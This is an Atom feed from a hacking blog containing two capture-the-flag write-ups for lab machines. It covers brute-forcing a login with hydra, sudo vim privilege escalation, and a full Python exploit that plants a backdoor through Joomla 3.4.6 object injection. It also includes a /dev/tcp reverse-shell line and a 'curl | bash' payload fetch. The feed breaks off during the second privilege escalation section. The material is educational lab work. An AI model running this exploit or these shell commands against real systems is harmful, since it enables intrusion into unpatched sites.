<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-15T11:54:14-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">FmF - Hacking blog ü©ª</title><author><name>FmF</name></author><entry><title type="html">Santa‚Äôs List</title><link href="http://localhost:4000/parrotctf-santas-list.html" rel="alternate" type="text/html" title="Santa‚Äôs List" /><published>2023-08-30T00:00:00-06:00</published><updated>2023-08-30T00:00:00-06:00</updated><id>http://localhost:4000/ParrotCtf-Santas_List</id><content type="html" xml:base="http://localhost:4000/parrotctf-santas-list.html">&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/1.jpg&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://parrot-ctfs.com/&quot;&gt;ü¶ú Parrot CTFs&lt;/a&gt; is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.&lt;/p&gt;

&lt;h1 id=&quot;content&quot;&gt;Content:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#initial-access-&quot;&gt;Initial access&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-&quot;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration-&quot;&gt;Enumeration üîé:&lt;/h1&gt;

&lt;p&gt;We start by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; to check the TTL of the machine to determine the OS we are dealing with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: &lt;a href=&quot;https://ostechnix.com/identify-operating-system-ttl-ping/&quot;&gt;Identify OS using TTL value&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now, let‚Äôs go with an nmap scan to view the open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.9 -oN allPorts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt; ‚Äì&amp;gt; We are doing a scan against all 65535 ports to search for open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--open&lt;/code&gt; ‚Äì&amp;gt; It will only report open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt; ‚Äì&amp;gt; It can be performed quickly, scanning thousands of ports per second.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate 5000&lt;/code&gt; ‚Äì&amp;gt; It sets the minimum rate of packets sent per second to 5000.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; ‚Äì&amp;gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; ‚Äì&amp;gt; It will be verbose in its output.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; ‚Äì&amp;gt; This option skips the host discovery stage.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; ‚Äì&amp;gt; It will save the output in a file called ‚ÄúallPorts‚Äù.&lt;/p&gt;

&lt;p&gt;We find out the following open ports:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/3.png&quot; width=&quot;250&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at what the page has.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see a login panel that has some information that we can use. The login panel says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Santa&apos;s administration panel&lt;/code&gt;, so maybe a valid username can be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;santa&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;initial-access-&quot;&gt;Initial access üîë:&lt;/h1&gt;

&lt;p&gt;We can try common credentials like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:root&lt;/code&gt; and many others‚Ä¶ But let‚Äôs try with the information that we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;santa:santa&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;santa:admin&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;santa:northpole&lt;/code&gt; and with those credentials, we can gain access‚Ä¶&lt;/p&gt;

&lt;p&gt;But let‚Äôs try other ways rather than guessing. For example, we can use the tool cewl to create a wordlist based on the content of the page.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cewl http://10.14.0.9/ --lowercase -w wordlist.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/5.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use the tool &lt;a&gt;cupp&lt;/a&gt; to generate different variations of words.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./cupp -w wordlist.txt&lt;/code&gt; ‚Äì&amp;gt; We pass the wordlist that we created with &lt;a&gt;cewl&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/6.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The content of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wordlist.txt.cupp.txt&lt;/code&gt; file generated by cupp is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that it generates a lot of variations.&lt;/p&gt;

&lt;p&gt;Now let‚Äôs do a bruteforce attack with the use of wordlist that we have and let‚Äôs try with the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;santa&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There are many ways to complete a bruteforce attack. We will use the tool &lt;a&gt;hydra&lt;/a&gt; in this case.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l santa -P wordlist.txt.cupp.txt 10.14.0.9 http-post-form &quot;/index.php:username=santa&amp;amp;password=^PASS^:Incorrect login&quot; -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/8.png&quot; width=&quot;700&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the correct credentials are &lt;a&gt;santa:northpole&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We are in and we can see a button to download a file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see a new username: &lt;a&gt;elf-manager&lt;/a&gt;. Maybe we can use it to login with SSH.&lt;/p&gt;

&lt;p&gt;But let‚Äôs first decrypt the MD5 hashes with &lt;a href=&quot;https://md5decrypt.net/en/&quot;&gt;md5decrypt.net&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/11.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What if we try reusing the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;northpole&lt;/code&gt; with the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elf-manager&lt;/code&gt;? We can try to connect to SSH and see if we can get in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It works üéâ. Now that we are inside the machine you need to do some things to ensure smooth operation:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will allow us to clean the screen with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now we can see the flag üéâ.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation-&quot;&gt;Privilege escalation üö©:&lt;/h1&gt;

&lt;p&gt;We need to enumerate the system to find a way to escalate privileges.&lt;/p&gt;

&lt;p&gt;One thing I always check first is &lt;a&gt;sudo -l&lt;/a&gt;. This command helps us determine if we have the ability to execute commands as other user. If we are lucky, we might discover that we can execute commands with the privileges of the root user.&lt;/p&gt;

&lt;p&gt;More info about privilege escalation techniques check &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can execute vim command as the root user. We can see in &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot;&gt;GTFOBins&lt;/a&gt; for a way to escalate privileges.&lt;/p&gt;

&lt;p&gt;Or we can do it this way:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo vim

esc + : + !bash --&amp;gt; This is to spawn a shell as root user.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/14.png&quot; width=&quot;100&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And now we are root :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/santa-list/15.png&quot; width=&quot;300&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hope you like it and learn something new :)&lt;/p&gt;</content><author><name>FmF</name></author><summary type="html"></summary></entry><entry><title type="html">Pet Shop</title><link href="http://localhost:4000/parrotctf-blogger.html" rel="alternate" type="text/html" title="Pet Shop" /><published>2023-08-19T00:00:00-06:00</published><updated>2023-08-19T00:00:00-06:00</updated><id>http://localhost:4000/ParrotCtf-Blogger</id><content type="html" xml:base="http://localhost:4000/parrotctf-blogger.html">&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/1.png&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://parrot-ctfs.com/&quot;&gt;ü¶ú Parrot CTFs&lt;/a&gt; is an advanced cybersecurity education platform and Capture The Flag provider. Their goal is to create the most realistic Capture The Flag challenges and demonstrate real-world attack scenarios.&lt;/p&gt;

&lt;p&gt;This is an easy difficulty machine that exploits a legacy Joomla Content Management System (CMS) and a binary that has SUID permissions to gain root privileges.&lt;/p&gt;

&lt;h1 id=&quot;content&quot;&gt;Content:&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#easy-way-%EF%B8%8F&quot;&gt;Easy way&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#not-too-easy-way-%EF%B8%8F&quot;&gt;Not too easy way&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-&quot;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;enumeration-&quot;&gt;Enumeration üîé:&lt;/h1&gt;

&lt;p&gt;We start by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; to check the TTL of the machine to determine the OS we are dealing with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/2.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the TTL value of 63, we can determine that the machine is running a Linux machine. However, this is not for sure, but it gives us an idea. For more information, you can view: &lt;a href=&quot;https://ostechnix.com/identify-operating-system-ttl-ping/&quot;&gt;Identify OS using TTL value&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now, let‚Äôs go with an nmap scan to view the open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.14.0.65 -oN allPorts&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt; ‚Äì&amp;gt; We are doing a scan against all 65535 ports to search for open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--open&lt;/code&gt; ‚Äì&amp;gt; It will only report open ports.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sS&lt;/code&gt; ‚Äì&amp;gt; It can be performed quickly, scanning thousands of ports per second.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--min-rate 5000&lt;/code&gt; ‚Äì&amp;gt; It sets the minimum rate of packets sent per second to 5000.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-n&lt;/code&gt; ‚Äì&amp;gt; Tells Nmap to never do reverse DNS resolution on the active IP addresses it finds.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-v&lt;/code&gt; ‚Äì&amp;gt; It will be verbose in its output.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-Pn&lt;/code&gt; ‚Äì&amp;gt; This option skips the host discovery stage.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-oN&lt;/code&gt; ‚Äì&amp;gt; It will save the output in a file called ‚ÄúallPorts‚Äù.&lt;/p&gt;

&lt;p&gt;We find out the following open ports:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/3.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let‚Äôs take a look at what the page has.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/4.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see some posts and a user joomla who wrote the posts.&lt;/p&gt;

&lt;p&gt;Let‚Äôs use &lt;a&gt;Wappalyzer&lt;/a&gt; to detect more information about what tecnologies the page is using.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/5.png&quot; width=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that the Content Management System (CMS) is Joomla, what is a for publishing web content like WordPress and others. Now that we know the CMS, we can search for any administration panel and try default creds. Maybe we have luck :), a quick search in Google show us that the directory for the admin panel is &lt;a&gt;/administrator&lt;/a&gt;. We can try to view it going to: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.14.0.65/joomla/administrator&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/6.png&quot; width=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By default, the username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and the password must be defined in the installation progress. We can try login with the user that we find earlier: ‚Äú&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;joomla:joomla&lt;/code&gt;‚Äù but it doesn‚Äôt work, so‚Ä¶ lets put this aside and continue doing other things.&lt;/p&gt;

&lt;p&gt;We can use &lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla&quot;&gt;HackTricks&lt;/a&gt; to search for commons ways to enumerate joomla and try to exploit it, first lets try to search the version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/7.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Going to the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/language/en-GB/en-GB.xml&lt;/code&gt; we can see the version of the CMS, now let‚Äôs search for public exploits for this version.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; to search for exploits and we can find a lot :)&lt;/p&gt;

&lt;p&gt;There are various ways to solve the machine, an easy one and a not-too-easy one. Let‚Äôs first look at the easy way.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/9.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;easy-way-Ô∏è&quot;&gt;Easy way üõ£Ô∏è:&lt;/h1&gt;

&lt;p&gt;Let‚Äôs do more enumeration. We can use &lt;a&gt;wfuzz&lt;/a&gt; to do fuzzing in the page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/10.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can inspect these directories one by one. We can find that some of them have directory listing capabilities, but we cannot find any useful information‚Ä¶&lt;/p&gt;

&lt;p&gt;Ok mmm‚Ä¶ Let‚Äôs fuzz for file extensions such as backup files: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bak, backup, bck‚Ä¶&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/11.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wow we can see that there is a configuration file configuration.backup. Let‚Äôs view its contents.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/12.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The output is ugly so let‚Äôs fix it up. Press &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + u&lt;/code&gt; to view the source code. This will make the output a lot prettier, and we can see a username and password. :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/13.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can login to the machine with the credentials that we found with: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh ron@10.14.0.65&lt;/code&gt;, and we are in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/14.png&quot; width=&quot;400&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we are inside the machine you need to do one thing to ensure smooth operation:&lt;/p&gt;

&lt;p&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This will allow us to clean the screen with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;not-too-easy-way-Ô∏è&quot;&gt;Not too easy way üõ£Ô∏è:&lt;/h1&gt;

&lt;p&gt;Let‚Äôs go back a bit and look the available exploits.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/8.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In this case, I am going to use the exploit with the title: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3.4.6 - &apos;configuration.php&apos; Remote Code Execution&lt;/code&gt;. You can find all the technical details &lt;a href=&quot;https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit -x php/webapps/47465.py&lt;/code&gt; to inspect the source of the exploit, and if you want to copy it to your local directory, you can use: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit -m php/webapps/47465.py&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If you execute it, it will tell you that it is not vulnerable. However, in reality, it is vulnerable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/15.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is where things get complicated. You need to modify and test the exploit using Burp Suite. If you want to understand how this really works, view the &lt;a href=&quot;https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/&quot;&gt;technical details&lt;/a&gt;. But to keep this write-up from getting too long, I‚Äôm going to give you my script to exploit it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/python3

import requests as r, string, random, re, signal, sys
from bs4 import BeautifulSoup

url = &quot;http://10.14.0.65/joomla/&quot;
#PROXS = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
PROXS = {}

def def_handler(sig, num):
	print(&quot;\n\nSaliendo...\n&quot;)
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def random_string(stringLength):
    letters = string.ascii_lowercase
    return &apos;&apos;.join(random.choice(letters) for i in range(stringLength))

def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request
	function = &apos;assert&apos;
	template = &apos;s:3:&quot;FmF&quot;;O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\0\\0\\0connection&quot;;i:1;}&apos;
	payload =  &apos;file_put_contents(\&apos;configuration.php\&apos;,\&apos;if(isset($_POST[\\\&apos;&apos; + backdoor_param +&apos;\\\&apos;])) eval($_POST[\\\&apos;&apos;+backdoor_param+&apos;\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;;&apos;
	function_len = len(function)
	final = template.replace(&apos;PAYLOAD&apos;,payload).replace(&apos;LENGTH&apos;, str(len(payload))).replace(&apos;FUNC_NAME&apos;, function).replace(&apos;FUNC_LEN&apos;, str(len(function)))
	return final

def request(url, payload):
	s = r.Session()
	page = s.get(url + &apos;index.php/login&apos;)
	soup = BeautifulSoup(page.content, &quot;html.parser&quot;)

	values = soup.find_all(&quot;input&quot;)

	csrf = values[-1] # Gets the CSRF token value
	ok = re.findall(&apos;name=&quot;(.*?)&quot;&apos;, str(csrf))
	csrf = ok[0]
	url = url + &apos;index.php/login?task=user.login&apos;

	return_value = values[-2] # Gets the return value
	ok = re.findall(&apos;value=&quot;(.*?)&quot;&apos;, str(return_value))
	return_value = ok[0]

	user_payload = &apos;\\0\\0\\0&apos; * 9
	inj_object = &apos;&quot;;&apos;
	inj_object += payload
	inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part
	password_payload = &apos;AAA&apos; + inj_object

	data = {
		&apos;username&apos;:user_payload,
		&apos;password&apos;:password_payload,
		&apos;return&apos;:return_value,
		csrf:&apos;1&apos;
	}

	s.post(url, proxies=PROXS, data=data)

def ping_backdoor(url, param_name):
	while True:
		command = input(&quot;[RCE]~&amp;gt; &quot;)
		res = r.post(url + &apos;configuration.php&apos;, data={param_name:&apos;system(\&apos;&apos;+ command +&apos;\&apos;);&apos;}) # Here is where the magic happens
		print(res.text)

if __name__ == &apos;__main__&apos;:
	backdoor_param = random_string(50) ## Generate a unique string for our payload
	payload = get_backdoor_pay()
	print(&quot;[+] Backdoor id: &quot; + backdoor_param)
	request(url, payload)
	print(&quot;[+] Backdoor is ready, you can enter now...\n&quot;)
	ping_backdoor(url, backdoor_param)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now with this, we can execute commands, but this is NOT a full interactive shell yet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/16.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To get an interactive shell, there are a lot of ways to do it, but I‚Äôm going to use this one:&lt;/p&gt;

&lt;p&gt;Create a file with the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.html&lt;/code&gt;, with this content:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/YOUR_IP_HERE/443 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now use the command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo python3 -m http.server 80&lt;/code&gt; to put a http server where we are sharing our files.&lt;/p&gt;

&lt;p&gt;And finally use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lvnp 443&lt;/code&gt; to listen for our reverse connection from our payload above.&lt;/p&gt;

&lt;p&gt;Now execute the command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl YOUR_IP_HERE | bash&lt;/code&gt; this is going to get the content of the file index.html and interpret the content as a bash command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/17.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that we get a shell like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;Now that we are inside the machine you need to do various things to ensure smooth operation:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script /dev/null -c bash&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + z&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stty raw -echo; fg&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reset xterm&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;-&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export TERM=xterm&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will allow us to clean the screen with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + l&lt;/code&gt; and if we do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl + c&lt;/code&gt; is not going to kill the shell, more info &lt;a href=&quot;https://invertebr4do.github.io/tratamiento-de-tty/#&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/petShop/18.png&quot; width=&quot;600&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configuration.backup&lt;/code&gt; file so here we can get the creds of the user ron and we can connect through SSH.&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation-&quot;&gt;Privilege escalation üö©:&lt;/h1&gt;

&lt;p&gt;Now that we are inside the machine as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ron&lt;/code&gt;, we need to enumerate the system to find a way to escalate privileges.&lt;/p&gt;

